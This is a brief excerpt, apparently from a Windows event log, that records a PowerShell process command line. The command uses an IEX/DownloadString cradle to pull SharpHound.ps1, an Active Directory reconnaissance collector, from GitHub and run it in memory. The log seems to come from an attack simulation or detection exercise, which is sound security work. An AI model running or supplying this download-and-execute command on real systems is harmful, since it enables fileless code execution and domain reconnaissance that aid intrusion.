	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {write-host \""Remote download of SharpHound.ps1 into memory, followed by execution of the script\"" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
